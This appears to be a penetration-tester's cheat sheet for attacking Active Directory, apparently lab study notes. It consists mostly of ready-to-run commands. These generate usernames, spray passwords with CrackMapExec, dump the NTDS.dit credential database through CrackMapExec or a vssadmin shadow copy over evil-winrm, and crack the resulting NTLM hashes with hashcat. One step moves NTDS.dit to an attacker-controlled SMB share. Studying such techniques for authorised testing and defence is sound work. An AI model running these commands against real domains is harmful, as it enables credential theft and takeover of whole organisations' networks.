# Attacking AD & NTDS
```table-of-contents
```
## 1. Dictionary Attacks & Enumeration
### Username Conventions
| **Convention**                                 | **Pattern**      | **Example (Jane Jill Doe)** |
| ------------------------------------------ | ------------ | ----------------------- |
| First Initial + Last Name                  | `flastname`  | `jdoe`                  |
| First Initial + Middle Initial + Last Name | `fmlastname` | `jjdoe`                 |
| First Name + Last Name                     | `firstname`  | `janedoe`               |
| Dot Separator                              | `first.last` | `jane.doe`              |
| Reverse Dot                                | `last.first` | `doe.jane`              |
### Generating Usernames (Username Anarchy)
```shell
# Usage: ./username-anarchy -i <input_names_file>
./username-anarchy -i names.txt

# Example Output:
# ben.williamson
# bwilliamson
# williamson.b
```
### Password Spraying with CrackMapExec
```shell
# Syntax: crackmapexec smb <DC_IP> -u <user_list> -p <password_list>
crackmapexec smb 10.129.201.57 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt
```
## 2. Capturing NTDS.dit
### Method A: Automated Dump (CrackMapExec)
```shell
# Dump NTDS using valid Domain Admin credentials
crackmapexec smb <DC_IP> -u <AdminUser> -p <Password> --ntds
```
### Method B: Manual Extraction (Volume Shadow Copy)
**1. Connect to the DC**
```shell
evil-winrm -i <DC_IP> -u <AdminUser> -p <Password>
```
**2. Check Privileges** Ensure you are in the `Administrators` or `Domain Admins` group.
```powershell
net user <username>
```
**3. Create Shadow Copy** Use `vssadmin` to create a snapshot of the C: drive.
```powershell
vssadmin CREATE SHADOW /For=C:
```
_Note the "Shadow Copy Volume Name" in the output (e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`)._
**4. Copy NTDS.dit** Copy the file from the shadow volume to a accessible folder.
```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```
**5. Exfiltrate** Move the file to your attack machine (e.g., via a mounted SMB share).
```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.14.x\CompData
```
## 3. Cracking NTDS Hashes
```shell
# Syntax: hashcat -m 1000 <hash> <wordlist>
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```